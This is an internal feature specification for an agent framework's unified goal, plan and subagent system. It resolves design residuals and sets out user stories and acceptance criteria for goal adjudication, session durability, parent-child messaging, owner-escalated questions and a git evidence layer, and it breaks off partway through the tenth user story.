# Feature Specification: Unified Goal / Plan / Subagent System (ADR-053)

**Created**: 2026-07-22
**Status**: Draft (ratification spec — requirements LOCKED by ADR-053 + twice-grilled v2.2 design + 17 interview decisions D1–D17)
**Input**: `docs/internal/architecture/ADR-053-unified-goal-plan-subagent.md` (Accepted, grill PASS) · `docs/internal/design/unified-goal-plan-subagent-target-design-v2.2.html` (the *what*) · `docs/internal/design/unified-goal-plan-subagent-DELIVERY-GOAL.md` (the *how/order/proof*).

> **Ratification mode.** This spec does NOT re-open decisions D1–D17. Its three jobs are: **(1)** resolve the 11 ADR §8 residual under-specifications as concrete, testable spec decisions; **(2)** map every acceptance criterion **G-1..G-16** and every §9.1 conformance diagram (**t0/t1/t2/t3/g4/g5/g6/g7 + §5 boot sweep**) to a named BDD scenario and a traceable test; **(3)** give field-level shape to every §6 wire type so the Phase-0 contracts wave authors schemas directly. FRs are tagged by delivery **Phase** (P0 spine+contracts · P1 substrate · P2 behaviors · P3 conformance). The go-git spike returned **GO** (ADR §6.1, +3.04 MiB stripped, no cgo) — the git layer is written on the go-git substrate while still specifying the degraded ladder.

---

## Available Reference Patterns

| Reference | Pattern | Relevance to this feature |
|-----------|---------|---------------------------|
| ADR-034 | Inline `oneOf` + discriminator hosted in `openapi.yaml` | Governs the `SessionMessage` envelope (external file refs inside `oneOf` emit non-compiling `As*` accessors). |
| ADR-032 (amended) | Delegate sub-turn runs as the TARGET agent's real identity (`spawnSubTurn`, `execSource`) | The child's soul/persona/tools/model come from the target, never the parent — the parent contributes only the task prompt + the curated snapshot (§8.5). |
| ADR-035 / ADR-037 | Raw-body-reject for forbidden fields, no back-compat | Precedent for rejecting illegal delegate launch-flag combos at `delegate.run` and forbidden budget/policy fields at the handler. |
| ADR-043 | Completion-signal marker protocol (`TASK_STATUS` / `[goal:evidence]`) | The `GOAL_STATUS: met / waiting_on_user` markers join this family; parser co-located with teaching fragment (S6). |
| ADR-046 | System-Agent implicit workspace membership | Owner-loop / verifier agents are System-Agent-class members. |
| ADR-049 / ADR-052 | The deterministic dispatch engine, verifier-as-real-agent, PUT-lockdown, Stop fan-out, boot reconciliation | Reused unchanged; this ADR supersedes ONLY the ADR-049 D4 one-shot owner-wake + round accounting, and the ADR-052 chat-goal after-every-turn trigger. |
| `pkg/agent/runner/worktree.go` | Detached-HEAD worktree + marker file + orphan reaper | The isolation-ladder top rung; native members reuse the pattern re-rooted under `work/`. |
| `pkg/skills/embedded/plan/SKILL.md` | Embedded plan skill | EXTEND with the §3b/§3c checklists — never fork a Planner agent (BOM). |

---

## Existing Codebase Context

### Symbols Involved

| Symbol | Role | Context |
|--------|------|---------|
| `pkg/tools/delegate.go` — `DelegateTool.execute` (L344) | modifies | Today dispatches only `run`\|`status`, hard-rejects the rest (L361 `invalid action %q: must be "run" or "status"`). Grows to the 9-action set + `message_parent`. |
| `pkg/tools/delegate.go` — `DelegateTaskState` (L776/L788/L807) | extends | In-memory chat-scoped task copy → durable per-entity JSONL 8-state session record (S2). `task_id` becomes deprecated alias of `session_id`. |
| `pkg/agent/subturn.go` — `spawnSubTurn`, `defaultMaxSubTurnDepth=3` (L28), `resolveEffectiveDelegationDepth` (delegation_depth.go L42) | calls / extends | Child spawn point; gains the curated context snapshot (§8.5) + the child steering queue + `message_parent`. Depth backstop already exists. |
| `pkg/agent/steering.go` — `steeringQueue`, `Steer`, `enqueueSteeringMessage`, skip-remaining-batch | extends | Parent→child `steer`/`respond` land in the child's per-scope queue at the next tool boundary. One injection path, made addressable + typed. |
| `pkg/agent/async_notifier.go` — `AsyncNotifier.Notify`, `AsyncOriginAgentID`, `AsyncTranscriptSessionID` | extends | Terminal-only wake → bounded typed wake (question/blocker/error/handback only; debounce ≥15 s, ≤4/h). |
| `pkg/bus/bus.go` — `MessageBus` | calls | Carries the typed `SessionMessage`; in-process, no new transport. |
| `pkg/agent/goal_loop.go` — `checkGoalLoopAfterTurn` (L271), `applyGoalCommandPrompt` (L42), `emitGoalStatusFrame` (L225), `goalIdleExpirySweep` (L479), `clearGoal` (L143), `cancelGoalVerifierIfAny` (L181), `goalSteeringPrompt` (L431) | modifies | The after-every-turn adjudication becomes **claim-or-idle** (per goal-id). Round counter increments per adjudication (§8.9). |
| `pkg/agent/plan_engine.go` — `lastUnmetTerminalSignature` (L190/L210), `processPlan` (L751), `dispatchReadyMembers` | modifies | F2 round-burn gate already landed (commit `02171db1`) as an **in-memory-only** `map[string]string` (its own doc: "no wire/persisted-state change … a process restart naturally drops this map"). This spec threads the owner-correction loop through it AND makes the gate **durable** — persist `last_unmet_terminal_signature` on the plan record so the F2 skip survives restart (C1/FR-147), closing the in-memory restart gap the standalone shipped. |
| `pkg/plan/plan.go` — `Plan.PlanPhase` (`plan_phase,omitempty`, L288) with values `dispatching\|judging\|synthesizing\|idle` (L173-178), `Plan.LastActivityAt` | extends | The persisted, boot-reconciled runtime sub-state of a `running` plan. Gains a NEW `awaiting_owner_correction` phase value + persisted `LastUnmetTerminalSignature` and `OwnerSessionID` fields so awaiting-owner-correction is a **durable PLAN condition** (C1) with a **named plan↔owner-session linkage** (m-3), not an in-memory flag; the S2 session enum stays at 8 states (awaiting-correction is NOT a session state — the plan-owner session is durable `paused`, identified by `OwnerSessionID`). |
| `pkg/agent/task_completion_signal.go` — `TASK_STATUS` / `[goal:evidence]` parser | extends | `GOAL_STATUS: met`/`waiting_on_user` join the family; parser + teaching fragment co-located. |
| `pkg/agent/verifier_adjudication.go`, `verifier_registry.go`, `judge.go`, `behavior_scan.go` | calls | The Judge (real verifier agent, 20k window, AND-combine ladder) — unchanged in nature; only WHEN it fires changes + the blocked-check honesty fix. |
| `pkg/plan/plan.go` — `Plan{DoD, JudgeRounds}`, `State{draft/approved/running/done/failed}` (L58-66), `FailedReasonJudgeRoundsExhausted` | extends | Plan lifecycle (5-state) is DISTINCT from the S2 session-lifecycle (8-state); do not conflate. Members carry `write_set`; plan carries `rationale`. |
| `pkg/tools/plan.go` — `create_plan` (dod required, L145/L175), `execute_plan` (member-criteria gate) | modifies | Gains `write_sets` + `rationale` schema; plan-lint gate at approve. |
| `pkg/task/criterion.go` — `AcceptanceCriterion`, `CriterionKind{check/prose/behavior}` (L21-27), `CriterionCheck`, `CriterionBehavior` | calls (reuse) | S1's "one criteria model" — REUSE unchanged (`machine` = existing `check`). |
| `pkg/security/ratelimit.go` — `IsPrivilegedAgent` (L30) | modifies (bypass) | D12: the app-level token budget deliberately does NOT honor `IsPrivilegedAgent` — core-agent turns debit. |
| `pkg/agent/orphan_watch.go` — startup reaper | calls (pattern) | Precedent for the boot-sweep reconciliation of persisted non-terminal sessions. |
| `go.mod` — go-git absent | adds | New dependency (spike GO, +3.04 MiB stripped, Apache-2.0 → NOTICE). |

### Impact Assessment

| Symbol Modified | Risk | d=1 Dependents (WILL break / must retest) | d=2 Dependents |
|-----------------|------|-------------------------------------------|----------------|
| `checkGoalLoopAfterTurn` (trigger semantics) | **CRITICAL** | `AgentLoop` turn-end hook; `goal_loop_test.go`; every chat-goal e2e | GoalStatusFrame consumers (`GoalIndicator.tsx`); global-cap accounting |
| `plan_engine.go` correction loop + `lastUnmetTerminalSignature` | **HIGH** | `plan_engine_test.go`, `plan_restart_continuity_adr052_qa_test.go`, `cap_admission_adr052_qa_test.go` | plan tile / board aggregation |
| `delegate.go` action dispatch | **HIGH** | every existing `run`/`status` call site; `delegate` tool-policy seed | ActivityPanel span feed; verifier delegation |
| `DelegateTaskState` → durable record | **HIGH** | orphan policy, boot sweep, status assembly | board task↔session 1:N aggregation |
| `task_completion_signal.go` (new markers) | **MEDIUM** | rung-0 gate; bounce economics tests | idle-settlement suppression |
| `IsPrivilegedAgent` bypass for tokens | **MEDIUM** | `pkg/security/ratelimit.go` cost-cap path (SEC-26) | Usage screen accounting |
| `GoalStatusFrame.state` enum (4→8) | **MEDIUM** | `GoalIndicator.tsx`; since-cursor replay | pill/panel reconstruction |
| new go-git dependency | **MEDIUM** | build size (Constraint #3); NOTICE file | `.git` sandbox block (security-lead) |

### Relevant Execution Flows

| Flow | Relevance |
|------|-----------|
| Chat `/goal` set → compile → confirm → work → claim/idle → Judge → done (t0) | The core loop; trigger semantics change here. |
| Standalone task ▶ Run → claim → gate → ladder → done (t1) | Same loop, goal in the task record. |
| Plan Execute → members per DAG → all-terminal → plan Judge → unmet → owner correction → done (t2/t3) | Owner-loop + correction verbs + F2 gate. |
| delegate spawn → child `message_parent` → parent answer/escalate → respond/steer → handback (g6/g7) | The session-control plane. |
| kill -9 → boot sweep → `failed(interrupted)` → recover (§5 boot sweep) | Crash/upgrade reconciliation. |

### Cluster Placement

Spans the **agent-loop / plan-engine** cluster (backend), the **contracts** cluster (Phase 0 wire), and the **SPA goal/activity** cluster (FE-1..FE-8). Cross-cutting; owned as one epic on `feature/plan-swimlane-board`.

---

## §8 Residual Resolution Ledger (the 11 locked spec decisions)

Each residual below is resolved here, then realized as an FR + BDD + TDD entry. None re-opens a D1–D17 decision.

| # | Residual | Resolution (one line) | Realized by |
|---|----------|-----------------------|-------------|
| **R§8.1** | D9 compile-gate false-accept has no runtime net | **Fail-closed-to-unmet verdict + escalate-to-owner ONCE, on a machine-checkable predicate.** The classifier `classifyNonVerdict(verifierTurn)` keys on **whether the verification mechanism ran** (M1), not on prose: (a) mechanism could NOT execute (sandbox-denied / tool unavailable / policy-blocked / exit-code unreadable) → **`unable_to_verify` → re-run, never scored** (G-3 blocked-check honesty), **bounded** — after `unable_to_verify_max_reruns` (K, default 3) consecutive unable-to-verify results on the same check it escalates to the owner as a persistently-blocked check so it cannot loop forever (m-4); (b) verifier turn RAN to completion but formed no judgment (genuinely subjective) → **`criterion_unjudgeable` → unmet** for that adjudication (AND-combine ⇒ goal stays unmet, **bounded by rounds**) AND exactly one `criterion_unjudgeable` owner-escalation per goal-id. **Remediation (M2):** the escalation SURFACES the mis-compile — it does NOT itself halt round consumption. The owner **re-states** the goal (a diffed, confirmed amendment per D11/N-6 that AMENDS to a new goal generation with the mis-compiled criterion fixed — criteria stay immutable per D9, but re-statement→amendment is a decided path) OR issues `/goal clear`. If the owner does nothing, the honest terminal is **`failed(judge_rounds_exhausted)`**. No runtime `criterion_unverifiable` verdict class is reintroduced; the criterion stays immutable. | FR-115/FR-116/FR-137/FR-138 · US-3 · BDD-A9/A10 |
| **R§8.2** | D2 answer-vs-escalate boundary undefined | **Must-escalate class + runtime-DERIVED authority tag, fail-closed.** Every `question`/`decision_request` carries `authority: self_ok \| owner_required` — but the child LLM authoring it is **untrusted**, so the tag is never taken at face value (M3): (i) an omitted/absent `authority` **defaults to `owner_required`** (fail-closed); (ii) the runtime `deriveQuestionAuthority(q)` **UPGRADES** `self_ok → owner_required` on a content check it performs itself — the question references a credential/secret, a spend/budget action, an irreversible tool, or is out-of-goal-scope — a child can never DOWNGRADE below the runtime's determination. `owner_required` MUST escalate — the runtime validator **rejects a parent `respond` to an `owner_required` question** (never LLM-trusted); the human/top-level owner is the terminus. A genuinely `self_ok` question (post-derivation) may be answered by the parent. | FR-131/FR-132/FR-133/FR-134/FR-139 · US-7 · BDD-D6/D7 |
| **R§8.3** | D12 budget mechanics (5 sub-gaps) | **(a)** default `token_budget` unset = **unbounded**, sentinel `0`, Usage-screen persistent "unbounded — set a budget" advisory. **(b)** operator warning at set-time: token cap ≠ dollar cap across providers. **(c)** brake honors **ADR-049 NFR-3 graceful wind-down** — current turn finishes, transition to `failed(budget_exhausted)` at the next boundary + handover summary; no new turn/dispatch/adjudication starts once exhausted (no mid-turn hard-fail). **(d)** ONE shared pool, single debit function `debitTokenBudget(n)` read-modify-write under one lock (decrement + exhaustion check are one critical section); persisted counter = Usage accounting, reconciled at boot. **(e)** the ceiling stays **restart-gated** (a live ceiling change would straddle two budgets, the N-15 hazard); the **live lever for runaway spend is the existing Stop/cancel cascade** (per-goal-id or global) — no new live token cut is added; documented. | FR-171..FR-178 · US-13 · BDD-J1..J5 |
| **R§8.4** | git no-go / degraded-ladder semantics per decision | **D13** Play-from-commit: repo present → resume from last boundary commit; no commit (size-guard skip / nested-repo skip / subdir-only) → **fresh attempt** (attempt 0), signalled. **D10** isolation: system-git worktree → go-git clone → subdir (planner picks the highest rung the runtime supports; never author a join the runtime can't execute). **D17** enforcement: repo present → operation-deny tool surface **+ Landlock/bash-policy `.git/` block** (caveat 3); subdir/no-repo → operation-deny still rejects `git commit/amend/rebase/rm`, Judge told "rung-1 diffs unavailable" (MIN-6 degraded contract); HEAD-divergence check only where a repo exists. | FR-151..FR-159 · US-10 · BDD-G1..G5 |
| **R§8.5** | D1 curated context snapshot undefined | **Deny-by-default, parent-authored allow-list, hard-capped — mandatory core exempt.** Snapshot = the task prompt + the goal/criteria the child must satisfy + parent-named artifact **references** (not contents) + engine-injected child identity (from the target per ADR-032). NO parent transcript, credentials, or sibling context. The `snapshot_max_bytes` (8 KiB) byte cap governs the **DISCRETIONARY** portion only (parent-named references + any parent-added notes); the **MANDATORY core** (task prompt + compiled criteria + engine-injected identity) is **EXEMPT** from the byte cap so a large-but-legitimate goal is never rejected for its own criteria (m4). `snapshot_max_refs` still bounds the reference count. Over-cap on the discretionary portion → `delegate.run` rejected with a narrow-the-snapshot tool error (never silently truncated). | FR-121..FR-124 · US-6 · BDD-D3 |
| **R§8.6** | needs_input warm-resume reconstructability predicate | **`isNeedsInputReconstructable(rec)` — AND of four:** (1) durable record `state=needs_input` **and** a checkpoint (message or git boundary commit) captured `result_so_far`/context digest at park; (2) child identity still resolves at boot (agent not deleted); (3) the open `correlation_id` + its owner scope still exist; (4) retained snapshot within `snapshot_max_bytes`. ALL true → preserved resumable (warm re-seed from checkpoint). ANY false → swept identically → `failed(interrupted)` carrying last checkpoint + open questions. The `needs_input.reconstructable` field persisted at park is a **park-time HINT only** (m5) — the AUTHORITATIVE determination is `isNeedsInputReconstructable(rec)` **re-evaluated at boot** (agents/correlations/snapshots may have changed since park), never the stored hint. | FR-117/FR-119 · US-5 · BDD-C4 |
| **R§8.7** | D6 deep-chain question latency unbounded | **Opt-in direct-escalate shortcut, default OFF (strict one-hop preserved).** A parent may declare at spawn (launch profile / config) that it auto-forwards `owner_required` questions upward; then the engine routes the question in ONE traversal to the nearest human-owning session, notifying each intermediate parent (info copy) without requiring N LLM turns. Bounds: `question_escalation_max_hops` (default = delegation depth 3) + `question_escalation_deadline` (default `needs_input_ttl`). Default (no opt-in) = strict one-hop (each parent forwards manually) — D6 unchanged as default; a parent may still intercept and answer before the forward completes. | FR-135/FR-136 · US-7 · BDD-D8 |
| **R§8.8** | S4 interlock ordering/atomicity (highest risk) | **ONE state machine** with named invariants INV-1..INV-9 (dedicated section below) covering verdict-lands, **durable** awaiting-owner-correction (a PLAN condition — persisted `plan_phase=awaiting_owner_correction` + `last_unmet_terminal_signature` on the plan record; the plan-owner session is durable `paused`, C1), concurrent-steer, boot-sweep (which EXEMPTS an awaiting-correction owner session from the `failed(interrupted)` sweep), and transactional-tail-append via a **write-ahead intent-log** (N-8/M4 — per-file JSONL gives only per-file temp+rename atomicity, so the multi-entity append is made all-or-nothing by an intent record replayed/rolled-back at boot). | FR-147/FR-148/FR-190..FR-199 · US-16 · BDD-K1..K5 |
| **R§8.9** | Round-accounting reconciliation (round = adjudication) | **A round is one adjudication** (claim-triggered OR idle-settled), never one worker turn. `judge_rounds_max` counts adjudications. Migration: stored integer is unchanged (old "turn+judge" round ⊆ one adjudication, so no inflation); only the increment site moves — `checkGoalLoopAfterTurn` increments per adjudication, `GoalStatusFrame.round` description updated. F2 `lastUnmetTerminalSignature` (no-re-judge-of-unchanged = no round) is consistent with adjudication counting. | FR-105/FR-106 · US-1 · BDD-A2/A11 |
| **R§8.10** | S2-lifecycle ↔ D14-pill crosswalk (drift guard) | **Two deliberately-distinct enums.** Durable S2 lifecycle (8) drives dispatch/settlement/`blocked_by`/boot; D14 pill (8) is display-only, `pill = f(lifecycle, engine_phase_overlay, plan_phase)`. The 3 pill states with no direct lifecycle state: `judging` ← ephemeral verifier-turn-in-flight signal, `judge_unavailable` ← ephemeral Judge-availability signal, and `re-planning` ← the **durable** `plan_phase=awaiting_owner_correction` on the plan record (after C1 this is a durable plan condition, not an ephemeral overlay, so the pill reconstructs correctly after a restart while the session sits at lifecycle `paused` — renders `re-planning`, not `waiting_on_user`). Crosswalk table in §Contract Surface. Confirmed NOT an accidental duplicate. | FR-185..FR-188 · US-14 · BDD-L1/L2 |
| **R§8.11** | Multi-goal-per-session cardinality | **Per-goal-id isolation.** Idle timers, pills, round budgets, settlement all keyed by goal-id, not session-id; a session with N goals runs N independent settlements/pills/timers. Global-cap counts **goal-bearing scopes** = active chat goals (one slot per goal-id) + running plans (the PLAN is ONE slot; its **members are NOT counted** — they run under the plan's slot) + **standalone tasks** (each is goal-bearing → one slot, m3) + enabled loops. **Delegate children and plan members are NOT goal-bearing (never counted).** Migration: legacy per-session goal maps 1:1 to one goal-id. | FR-107..FR-109 · US-1 · BDD-M1/M2 |

---

## User Stories & Acceptance Criteria

### User Story 1 — Claim-or-idle goal adjudication, per goal-id (Priority: P0)

An operator sets a chat goal; the Judge must fire **only** on an explicit completion claim or on event-driven idle settlement — never after every worker turn (the shipped ADR-052 defect) — and a session may carry multiple independent goals. This removes blind/over-eager judging (ADR §1.1) and round-burn on quiet turns.

**Why this priority**: The trigger fix is the ADR's through-line and lands regardless of the git spike; it supersedes ADR-052's after-every-turn adjudication and gates everything downstream.

**Independent Test**: Run a chat goal against a worker that never claims; assert the Judge fires exactly once per idle settlement (after the quiet window), consumes exactly one round, and re-arms only on new activity. Add a second goal to the same session; assert two independent pills/timers.

**Acceptance Scenarios**:
1. **Given** an active chat goal and a worker turn ending in `[goal:evidence]` + `GOAL_STATUS: met`, **When** the turn completes, **Then** the Judge is invoked exactly once; met→done, unmet→one round + steer (G-1).
2. **Given** an active chat goal with no pending turn, no running sub-tasks/subagents/shells, not waiting-on-user, rounds remaining, **When** the ~60 s quiet window elapses, **Then** exactly one idle adjudication fires, consumes one round, and re-arms only on new activity (G-2).
3. **Given** an idle settlement with no claim, **When** the Judge runs, **Then** it bypasses the rung-0 gate and judges persisted evidence (artifacts, write-set-scoped diffs, latest checkpoint) (G-3).
4. **Given** a session carrying two active goals, **When** each reaches settlement independently, **Then** two pills, two idle timers and two round budgets exist, each keyed by goal-id, and each consumes its own global-cap slot (R§8.11).
5. **Given** a round previously meant "one worker turn + judge", **When** the system upgrades, **Then** `judge_rounds_max` counts adjudications and in-flight integer counts are preserved unchanged (R§8.9).

---

### User Story 2 — Waiting-on-user typed pause (Priority: P0)

A worker turn that ends in a question to the user must **pause with no verdict and no round** via a typed marker, never be judged as a completion and never inferred by a prose classifier.

**Why this priority**: A false negative burns a round while the user is being asked something (the exact ADR §1.1 flaw); a false positive suppresses adjudication forever. The typed marker eliminates both.

**Independent Test**: Emit `GOAL_STATUS: waiting_on_user`; assert round count unchanged, no verdict, and idle settlement suppressed until the user replies.

**Acceptance Scenarios**:
1. **Given** an active goal, **When** a worker turn ends with `GOAL_STATUS: waiting_on_user`, **Then** the goal pauses, no verdict is produced, no round is consumed, and idle settlement is suppressed while waiting (G-5).
2. **Given** no marker on a turn, **When** the turn ends, **Then** the deterministic fallback is "not waiting" (no marker → not waiting).
3. **Given** a paused-for-user goal, **When** the user replies in normal chat, **Then** the goal resumes and the idle timer re-arms.

---

### User Story 3 — SMART goal compiler, feasibility gate, echo-confirm, amendment (Priority: P0)

On `/goal set`, the engine compiles user intent into a machine/behavior/prose criteria ladder, gates it for reachability AND semantic judgeability, echoes the literal compiled commands in chat for confirmation, and treats a re-statement as a diffed amendment.

**Why this priority**: Compiling criteria is a privileged mint (MAJ-13/N-5). An impossible-or-unjudgeable immutable criterion guarantees round exhaustion; the compile-time gate is the sole filter (D9), so it must be exhaustive and its false-accept fallback (R§8.1) defined.

**Independent Test**: Inject a criterion referencing an out-of-policy tool/credential; assert rejection at `/goal set` with no immutable-impossible criterion persisted. Inject "the refactor feels maintainable"; assert semantic-judgeability rejection.

**Acceptance Scenarios**:
1. **Given** a compiled criterion referencing a tool/credential outside the agent's policy, **When** `/goal set` runs, **Then** the feasibility gate rejects it at compile; no criterion persists (G-7).
2. **Given** a compiled criterion with no determinable truth ("feels maintainable"), **When** compiled, **Then** it is rejected for semantic non-judgeability at compile time (D9).
3. **Given** a compiled goal, **When** the agent echoes it (including literal commands) in chat, **Then** the goal goes active only on the user's chat reply — no form/modal (G-8, D11).
4. **Given** an active goal, **When** the user issues `/goal <new intent>`, **Then** it is diffed against the current goal and surfaced as an amendment (added/changed/dropped) to confirm — never a silent recompile (N-6).
5. **Given** `/goal clear`, **When** issued, **Then** the in-flight verifier AND any in-flight compilation are cancelled, the goal removed, and a later stray `GOAL_STATUS: met` does nothing (N-12).
6. **Given** the compile gate accepted a criterion the runtime Judge then genuinely cannot rule on, **When** adjudicated, **Then** the criterion resolves unmet and the owner is escalated exactly once (`criterion_unjudgeable`); the escalation SURFACES the mis-compile (it does not itself halt round consumption); the owner re-states the goal (a diffed amendment that fixes the criterion) or `/goal clear`s, and absent owner action the goal honestly terminates `failed(judge_rounds_exhausted)` (R§8.1).
7. **Given** a `criterion_unjudgeable` escalation was surfaced, **When** the owner re-states the goal, **Then** the re-statement is diffed and confirmed as an amendment (D11/N-6) that mints a new goal generation with the mis-compiled criterion corrected — never a silent recompile.

---

### User Story 4 — Unified goal / criteria record, one model two authors (Priority: P0)

The chat goal, the standalone task, and the plan DoD share ONE criteria model (`AcceptanceCriterion`, reused), authored two ways: chat = agent-compiled from intent; task/plan = explicit at creation.

**Why this priority**: S1 is the anti-drift spine — a second goal store for tasks is a blocking finding (DoD-11).

**Independent Test**: Assert the compiled chat-goal criteria and a task's explicit criteria deserialize into the SAME `AcceptanceCriterion` schema and are judged by the same ladder.

**Acceptance Scenarios**:
1. **Given** a chat goal and a task, **When** each is judged, **Then** both use the identical `AcceptanceCriterion` (kind check/behavior/prose) and the same AND-combine ladder — no second goal store exists.
2. **Given** a plan, **When** its DoD is evaluated, **Then** the DoD is the same criteria model at member-outcome scope.

---

### User Story 5 — Durable 8-state session record + boot-sweep recovery (Priority: P0)

Session lifecycle moves from an in-memory chat-scoped map to persisted per-entity JSONL with an 8-state enum, and a boot sweep reconciles every non-terminal session with no live turn after any restart or trigger-semantics upgrade.

**Why this priority**: Without reconciliation a routine restart wedges everything silently (CRIT-1) — a guaranteed production incident. This is the substrate idle-settlement/all-terminal/`blocked_by` read from.

**Independent Test**: `kill -9` the gateway mid-run; after restart assert every non-terminal session with no live turn — EXCEPT a reconstructable parked `needs_input` and a `paused` awaiting-owner-correction owner session, both preserved — reports `failed(interrupted)` within N s carrying its last checkpoint + undelivered messages, the plan re-judges/re-dispatches (but does NOT re-judge an unchanged awaiting-correction plan, per the persisted signature), and idle settlement fires — no session left `running` with no live turn (A-17/G-13).

**Acceptance Scenarios**:
1. **Given** a mid-plan `kill -9`, **When** the gateway restarts, **Then** each persisted `running`/`paused` session **with no live turn AND not an awaiting-owner-correction owner session** → `failed(interrupted)` within N s, a `session.failed` event is emitted, and the plan recovers (G-13).
2. **Given** a parked `needs_input` session at boot, **When** `isNeedsInputReconstructable` (re-evaluated at boot, not the stored hint) is TRUE, **Then** it is preserved as resumable; **When** FALSE, **Then** it is swept identically to `running` (R§8.6).
3. **Given** a deploy that changes trigger semantics, **When** the boot sweep runs, **Then** in-flight goals are quiesced and re-baselined (idle timers re-armed, trigger config re-read) so no goal straddles two semantics (N-15).
4. **Given** a plan durably in awaiting-owner-correction (`plan_phase=awaiting_owner_correction`, its owner session `paused`) at `kill -9`, **When** the gateway restarts, **Then** the owner session is EXEMPT from the `failed(interrupted)` sweep (it is legitimately idle awaiting the owner, like a reconstructable `needs_input`), the persisted `last_unmet_terminal_signature` survives so the engine does NOT re-judge the unchanged all-terminal state, and no JudgeRound is burned by the restart (C1, closes the standalone-F2 restart gap).

---

### User Story 6 — Typed SessionMessage transport + delegate action set + message_parent (Priority: P0)

ONE typed, schema-validated `SessionMessage` envelope over the existing MessageBus derives every control/visibility surface. The `delegate` tool grows from `run|status` to the full 9-action set, and a child gets a first-class `message_parent` tool with a curated context snapshot at spawn.

**Why this priority**: This is the largest slice and the substrate Phase-2 behaviors wire to (no stubs). Delegation is fire-and-collect only today (`pkg/tools/delegate.go` rejects all but `run|status`).

**Independent Test**: Spawn a native child; assert `message_parent(question)` lands in the parent inbox, `steer`/`respond` land at the child's next tool boundary keeping warm context, per-child ceilings enforce, and the inbox survives a parent Stop/Play (durable, keyed to chat/plan id).

**Acceptance Scenarios**:
1. **Given** a native child, **When** it calls `message_parent(progress/checkpoint/artifact/blocker/question/handback)`, **Then** each lands typed in the parent inbox with dedupe-by-`message_id` and untrusted-origin framing.
2. **Given** a parent, **When** it calls `steer`/`respond`/`cancel`/`follow_up`/`peek`/`inbox`/`inbox_ack`, **Then** each has a defined derived behavior; an illegal launch-flag combo is rejected at `delegate.run` (not silently accepted).
3. **Given** a child exceeding its per-child unacked ceiling (20 open question+blocker), **When** it sends again, **Then** the send fails back to the child as a tool error ("await answers"), never a silent drop; a sibling child is unaffected (D15).
4. **Given** a `delegate.run` with a snapshot over `snapshot_max_bytes`/`snapshot_max_refs`, **When** dispatched, **Then** it is rejected with a narrow-the-snapshot error (R§8.5).
5. **Given** `needs_input` on a native child, **When** it exceeds TTL (24 h), **Then** it escalates at T1 and auto-`handback(pause)` at TTL — never silent (G-6).

---

### User Story 7 — Parent-routed questions, answer-vs-escalate policy, latency-bounded deep chains (Priority: P0)

A child asks its **parent**; the parent answers-or-escalates per an authority policy; only a direct session/plan owner asks the human, conversationally in chat, with no per-question reply card.

**Why this priority**: Nothing today governs when a parent answers versus escalates — a parent could silently hallucinate an answer to an authority-bearing question (R§8.2).

**Independent Test**: Tag a question `owner_required`; assert the runtime rejects a parent `respond` and the question reaches the human. Tag `self_ok`; assert the parent may answer.

**Acceptance Scenarios**:
1. **Given** a child question tagged `owner_required`, **When** the parent tries to `respond` directly, **Then** the runtime validator rejects it and the question forwards to the owner terminus (human/top-level) (R§8.2).
2. **Given** a `self_ok` question, **When** the parent answers, **Then** `respond` is accepted and routed by `correlation_id`; out-of-order answers are safe.
3. **Given** the human answers in normal chat, **When** they reply, **Then** correlation routing is the parent's job — no separate approval/correlation UX renders (D2, channel-portable).
4. **Given** a parent that opted into direct-escalate for `owner_required` questions, **When** a deep-chain question is raised, **Then** it reaches the nearest human owner in one engine traversal within `question_escalation_max_hops`/`_deadline`; default (no opt-in) stays strict one-hop (R§8.7).

---

### User Story 8 — 3P (external-CLI) honest fire-and-collect (Priority: P0)

`subagent_3p` children (claude-code/codex/opencode) never advertise `question`/`needs_input`/warm-resume; a `respond` spawns a NEW corrective session (original prompt + answer folded in).

**Why this priority**: External CLIs have no warm-resume/needs_input primitive; advertising one is a lie to operators (D5).

**Independent Test**: Spawn a 3P child; assert it shows a fire-and-collect badge, emits only progress/artifact/handback/claim, and a `respond` produces a new corrective session, not a warm resume.

**Acceptance Scenarios**:
1. **Given** a 3P child, **When** it runs, **Then** it emits only progress/artifact/handback markers and the terminal claim line — no question/needs_input.
2. **Given** a parent `respond` to a 3P child, **When** issued, **Then** a new corrective 3P session is spawned carrying the prior context — never an in-place warm resume.
3. **Given** the specialist profile applied to a 3P child, **When** launched, **Then** it degrades to fire-and-collect (no silent capability claim).

---

### User Story 9 — Owner loop + correction verbs + awaiting-owner-correction gate (Priority: P0)

Every plan runs inside a persistent owner agent loop (supersedes ADR-049 D4 one-shot wake). On an all-terminal-but-unmet DoD, the plan enters a **durable** awaiting-owner-correction condition — persisted as `plan_phase=awaiting_owner_correction` + `last_unmet_terminal_signature` on the plan record (F2 fix — no re-judge of unchanged state, and the gate now survives restart, C1) while the plan-owner session sits at the durable lifecycle state `paused` (the 8-state S2 enum is NOT inflated — awaiting-correction is a plan condition, not a session state). The owner corrects append-only with SUPERSEDE and TARGETED-RETRY, each recording a transactional revision entry committed via the write-ahead intent-log (M4).

**Why this priority**: Auto-reset + owner correction is a new build (architect F1/F2), and the F2 round-burn is a live shipped defect fixed standalone-and-immediately (§4.7).

**Independent Test**: Drive a plan to all-terminal-but-unmet; tick the engine N times and assert exactly one round is consumed, then the plan holds until the owner appends. Kill mid-append; assert the DAG rolls back to the exact pre-append shape.

**Acceptance Scenarios**:
1. **Given** an all-terminal-but-unmet plan, **When** the engine ticks N times on unchanged state, **Then** exactly one round is burned and the plan waits in `awaiting-owner-correction` (G-9, F2 proof).
2. **Given** an unmet DoD with frozen members, **When** auto-reset runs, **Then** it excludes frozen members; tails depend only on `done` outcomes; an unreachable DoD takes the honest-exit path (no livelock) (G-10).
3. **Given** a correction, **When** the owner appends / SUPERSEDEs a done member / TARGETED-RETRYs a frozen-transient member, **Then** each records a revision entry; the append is transactional (Stop/crash mid-append → pre-append DAG); the DoD stays immutable (G-11).
4. **Given** a Stopped plan, **When** Play is pressed, **Then** a `resumed_from` generation is minted (cancelled→approved), done members preserved, failed/cancelled resume from the last git commit (no-commit → fresh attempt), JudgeRounds 0 (G-12, D13).
5. **Given** a plan, **When** viewed, **Then** members show status only — NO per-member start/cancel/resume (only standalone tasks carry ▶/■/Play) (D7).

---

### User Story 10 — Workspace git evidence layer + operation-deny + degraded ladder (Priority: P0)

`work/` is an embedded go-git hidden repo, auto-committed at write-set-scoped, serialized task/attempt boundaries; per-attempt diffs are native rung-1 Judge evidence; `.git` is denied by operation (allow log/blame/show/diff; deny commit/amend/rebase/rm) paired with a sandbox `.git/` block; HEAD-divergence → "evidence integrity lost".

